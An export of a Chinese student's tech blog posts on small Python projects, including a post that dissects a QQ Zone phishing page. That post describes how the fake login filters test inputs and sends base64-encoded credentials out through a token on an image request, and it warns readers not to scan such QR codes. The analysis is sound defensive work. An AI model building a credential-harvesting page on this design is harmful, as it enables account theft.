        <tags>
            
            <tag> tips </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统</title>
      <link href="/2019/08/18/Park_at_ease/"/>
      <url>/2019/08/18/Park_at_ease/</url>
      
        <content type="html"><![CDATA[<h1 id="Park-at-ease"><a href="#Park-at-ease" class="headerlink" title="Park at ease"></a>Park at ease</h1><p><strong>停车场管理系统</strong><br><em>基于Python实现</em>  </p><p><strong>Park Management System</strong><br><em>Based on Python…</em>    </p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello, this is Park_at_ease!'</span><span class="token punctuation">)</span></code></pre><p><img src="/2019/08/18/Park_at_ease/20190818195449125.png" alt="运行界面"></p><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p>这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。  </p><p>原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。<br>这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！  </p><p><em>PS:原则上不提供技术支持哈。</em></p><hr><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p>欢迎大家在此基础上继续完善鸭~<br><strong>欢迎Star、Fork、提PR &amp; issue！</strong></p><p><strong>使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！</strong>  </p><hr><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2> <a id="more"></a> <p>这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。<br>这里直接就截屏放出来吧，PDF还有别的内容懒得改了。<br>如果有什么建议<strong>欢迎在GitHub上提issue</strong>或者<strong>在这里评论</strong>哈~！  </p><p><img src="/2019/08/18/Park_at_ease/20190818165341354.png" alt="20190818165341354">  </p><p><img src="/2019/08/18/Park_at_ease/20190818165453514.png" alt="20190818165453514"></p><p><img src="/2019/08/18/Park_at_ease/20190818165508495.png" alt="20190818165508495"></p><p><img src="/2019/08/18/Park_at_ease/20190818165517893.png" alt="20190818165517893"></p><p><img src="/2019/08/18/Park_at_ease/20190818165530183.png" alt="20190818165530183"></p><p><img src="/2019/08/18/Park_at_ease/20190818165538685.png" alt="20190818165538685"></p><p><img src="/2019/08/18/Park_at_ease/20190818165548553.png" alt="20190818165548553"></p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 管理员界面 Administrator Interface  </li><li><input checked="" disabled="" type="checkbox"> 文件操作 FileIO</li><li><input checked="" disabled="" type="checkbox"> 登录界面 Login  </li><li><input disabled="" type="checkbox"> 登录加密 Login Encryption</li><li><input disabled="" type="checkbox"> 图形界面 GUI  </li><li><input disabled="" type="checkbox"> 多线程或多进程 Multithreading or Multiprocessing  </li><li><input disabled="" type="checkbox"> 邮件推送 Email Push  </li><li><input disabled="" type="checkbox"> 微信推送 WeChat Push  </li><li><input disabled="" type="checkbox"> TCP  </li><li><input disabled="" type="checkbox"> 嵌入式开发 Embedded Development<br>  etc.  </li></ul><hr><p><strong>具体请移步到GitHub鸭！</strong></p><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p><img src="/2019/08/18/Park_at_ease/20190818195154540.png" alt="喵~"></p><p>溜了溜了<br>下次再见啦~</p><blockquote><p>搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于模拟点击实现数据自动测量</title>
      <link href="/2019/07/10/Idea_AutoMeasure/"/>
      <url>/2019/07/10/Idea_AutoMeasure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运一篇之前写的小想法啦~</p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>人工智能——先人工后智能<br>哪里有现成数据给你<br>还不是人工手动去测……  </p><p>大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。<br>就是这个也太枯燥了8，效率还低。<br>不如py一下写个自动执行的！<br>说写就写呗<em>（斜眼笑.gif)</em>  </p><h2 id="初代版本"><a href="#初代版本" class="headerlink" title="初代版本"></a>初代版本</h2><p>发现Python有个现成的第三方库叫<code>PyAutoGui</code>库，它给的函数还是挺方便的。<br>按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。  </p><p>总之还是挺不错的吧<br>输入<strong>角度、次数、开始index</strong>（程序崩的时候备用），<br>然后就可以自动开始测量，新建文件夹，按顺序命名保存。  </p><p><img src="/2019/07/10/Idea_AutoMeasure/code.png" alt="code1"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code2.png" alt="code2"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code3.png" alt="code3"></p><p>理论一天可测的数据量从270组提高到435组，<strong>效率提升了61%吧！</strong>  </p><p>还要感谢潇潇弟弟陪我debug 嘻嘻嘻~  </p><hr><h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><blockquote><p><em>Update on 20190725.</em></p></blockquote><p>之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。</p><p>由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。</p><p>于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！  </p><p>另外还加入了log，记录日志文件方便检查错误。</p><p>嘿嘿嘿~</p><p><img src="/2019/07/10/Idea_AutoMeasure/update1.png" alt="update"></p><p><img src="/2019/07/10/Idea_AutoMeasure/update2.png" alt="运行界面"></p><p><img src="/2019/07/10/Idea_AutoMeasure/log.png" alt="log"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 模拟点击 </tag>
            
            <tag> 大创 </tag>
            
            <tag> 自动 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇 随便写写</title>
      <link href="/2019/07/09/FirstBlog/"/>
      <url>/2019/07/09/FirstBlog/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>搬运自我的CSDN博客 </p></blockquote><p>这篇可以算是第一次公开发出来的吧<br><em>（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233</em></p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, everyone!"</span><span class="token punctuation">)</span></code></pre><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>  上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是<em>EE</em>和<em>CS</em>方向的。</p><p>这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。</p><p>大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。</p><p>其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 </p><p>登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。</p><hr><h2 id="When"><a href="#When" class="headerlink" title="When?"></a>When?</h2><p>其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……<br>当然，<strong>有想法</strong> &amp;&amp; <strong>有空</strong> 的时候，就来这儿写点东西吧！</p><hr><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><p>其实我感兴趣的东西挺多的 emmm<br>比如说大体说一说嘛：</p><ul><li><h4 id="嵌入式相关"><a href="#嵌入式相关" class="headerlink" title="嵌入式相关"></a>嵌入式相关</h4><ul><li>MCU单片机</li><li>FPGA</li><li>物联网 IoT<ul><li>ESP8266<br>（准备好好研究一波，可以单独列一列）</li></ul></li></ul></li><li><h4 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h4><ul><li>Python 以及各种库</li><li>MATLAB  </li></ul></li><li><h4 id="人工智能-AI"><a href="#人工智能-AI" class="headerlink" title="人工智能 AI"></a>人工智能 AI</h4><ul><li>机器学习 Machine Learning，ML </li></ul></li><li><h4 id="计算机视觉-Computer-Vision，CV"><a href="#计算机视觉-Computer-Vision，CV" class="headerlink" title="计算机视觉 Computer Vision，CV"></a>计算机视觉 Computer Vision，CV</h4></li><li><h4 id="数据分析与挖掘"><a href="#数据分析与挖掘" class="headerlink" title="数据分析与挖掘"></a>数据分析与挖掘</h4><ul><li>数据获取（如爬虫虫）</li><li>数据可视化</li></ul></li><li><p>数据挖掘</p></li><li><h4 id="微信小程序开发"><a href="#微信小程序开发" class="headerlink" title="微信小程序开发"></a>微信小程序开发</h4></li><li><h4 id="前端尝个鲜"><a href="#前端尝个鲜" class="headerlink" title="前端尝个鲜"></a>前端尝个鲜</h4></li><li><h4 id="视频制作"><a href="#视频制作" class="headerlink" title="视频制作"></a>视频制作</h4></li><li><p>etc.</p></li></ul><p>其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。<br>于是乎就<strong>想写啥就写啥</strong>呗。<br>不过基本上以小想法为主，就是随便记录一下这样吧。  </p><hr><p><strong>好啦第一篇就这样随便写写了。<br>溜啦溜啦~</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> blog </tag>
            
            <tag> 小想法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 某QQ空间盗号页面分析</title>
      <link href="/2019/03/30/Idea_AnalysisOfHackingPage/"/>
      <url>/2019/03/30/Idea_AnalysisOfHackingPage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/1.jpg" alt="1"></p><p>然后感觉不对劲，肯定是被盗号了。  </p><p>然后突然有个脑洞，去看看这里面有啥吧  </p><h2 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h2><p>用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似<code>url.cn/...</code>的短链接。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/2.jpg" alt="2"></p><p>用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/3.png" alt="3"></p><p>于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/4.png" alt="4"></p><p>感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/5.png" alt="5"></p><p>点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/6.png" alt="6"></p><p>乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/7.png" alt="7"></p><p>而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9）</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/8.png" alt="8"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/9.png" alt="9"></p><p>顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。</p><hr><p>jio得还没完，这token咋来的，提交的<strong>账号密码去哪了</strong>emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/10.png" alt="10"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/11.png" alt="11"></p><p>哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/12.png" alt="12">  </p><p><em>// 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢</em>  </p><hr><p>到这差不多了，但感觉还没完，我们再来<strong>查查这个域名</strong>吧。</p><p>P13-15注册者信息，这人注册的域名真多。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/13.png" alt="13">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/14.png" alt="14">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/15.png" alt="15"></p><p>用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/16.png" alt="16"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是个做得有点水平的钓鱼网站。</p><p><strong>碰到类似的二维码别乱扫，扫了也别登录！</strong></p><p>至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/17.jpg" alt="又开始了"></p><p>以上内容均基于公开资料，<strong>仅供学习研究使用，请勿用于非法用途</strong>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> QQ空间 </tag>
            
            <tag> 盗号 </tag>
            
            <tag> 分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用python-docx批量提取Word中的信息进而导入Excel</title>
      <link href="/2019/03/21/Idea_python-docx/"/>
      <url>/2019/03/21/Idea_python-docx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><p>又是个小脑洞<br>最近有个比赛要统计一下各组信息，信息来自Word版的申请表。</p><p><img src="/2019/03/21/Idea_python-docx/1.jpg" alt="1"></p><p>考虑到Word要一个一个打开，再复制粘贴。</p><p>简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。  </p><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。</p><p>而后发现有个<strong>第三方库<code>python-docx</code></strong>，于是乎不想造轮子了，直接拿来用吧。</p><p>然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。</p><h2 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h2><p>文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。</p><h2 id="批量读取"><a href="#批量读取" class="headerlink" title="批量读取"></a>批量读取</h2><p>遍历文件夹下所有文件，筛选<code>.docx</code>且排除临时文件，噫少了俩。</p><p>原来还有.doc格式的，另存为.docx <em>(docx库只支持.docx)</em>。</p><p>依次读取每个文件，拼接string列表，得到所需信息。</p><p><img src="/2019/03/21/Idea_python-docx/2.jpg" alt="2"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>将infolist按照<code>.csv</code>的格式写入文件。</p><blockquote><p>其实可以调用第三方库来实现的。</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！  </p><p><strong>生产环境真复杂</strong>  </p><p><img src="/2019/03/21/Idea_python-docx/3.jpg" alt="遇到的情况">  </p><p><img src="/2019/03/21/Idea_python-docx/4.jpg" alt="4">  </p><p>如果用Excel打开<code>.csv</code>，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养  </p><p>又查了查资料，新建<code>.xlsx</code>，从文本导入到Excel，设置好属性。  </p><p>几好，完事！</p><p><img src="/2019/03/21/Idea_python-docx/5.jpg" alt="修正后的匹配代码">  </p><p><img src="/2019/03/21/Idea_python-docx/6.jpg" alt="最终得到的Excel">  </p><blockquote><p>于是乎边查资料边debug边改代码 花了一个多两个小时<br>估计几个人同时手动做早都做完了  </p></blockquote><p>（其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> docx </tag>
            
            <tag> word </tag>
            
            <tag> csv </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于PushBear API实现微信消息推送</title>
      <link href="/2019/03/07/Idea_PushBearAPI_WeChatPush/"/>
      <url>/2019/03/07/Idea_PushBearAPI_WeChatPush/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小想法啦~  </p></blockquote><h2 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h2><p>基于PushBear API实现微信消息提醒  </p><p><a href="http://pushbear.ftqq.com/admin/#/" target="_blank" rel="noopener">PushBear API</a></p><p>用requests里现成的方法就完事了。  </p><h2 id="tkinter-GUI"><a href="#tkinter-GUI" class="headerlink" title="tkinter GUI"></a>tkinter GUI</h2><p>就是直接写代码感觉有点不友好</p><p>于是想做个图形界面</p><p>基于Python GUI库tkinter简单做了一下<br><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/1.jpg" alt="code">  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/GUI.png" alt="GUI"></p><blockquote><p>（代码手动写布局太难受了<br>（还是直接用代码POST/GET方便emmm<br><em>（突然jio得LabVIEW做图形界面真方便</em></p></blockquote><h2 id="微信推送效果"><a href="#微信推送效果" class="headerlink" title="微信推送效果"></a>微信推送效果</h2><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/push.jpg" alt="推送效果"></p><p><strong>打开后是<code>Markdown</code>渲染的效果呢！</strong>  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/2.jpg" alt="Markdown"></p><p>   （完）  </p><blockquote><p><strong>20191221 Update：</strong>  </p><p>好久没用了不知道现在还能不能用了233</p></blockquote><blockquote><p><strong>20200211 Update:</strong></p><blockquote><p>⚠️ 直发服务转代发的通知（重要）<br>因多次被恶意举报，从2019年6月开始，只提供「已经微信认证后的服务号」进行授权后，用其自有接口权限代发。<a href="http://sc.ftqq.com/6.version" target="_blank" rel="noopener">代发授权和绑定教程</a></p></blockquote><p>最近弄微信消息提醒又来看了看，发现一对多的推送必须要<strong>绑定已认证的服务号</strong>才能使用了。</p><p>但是<strong>Server酱</strong>的给自己绑定的微信号推送消息还是有效的。</p><p>详见：<a href="https://sc.ftqq.com/" target="_blank" rel="noopener">https://sc.ftqq.com/</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> API </tag>
            
            <tag> 微信 </tag>
            
            <tag> 消息推送 </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
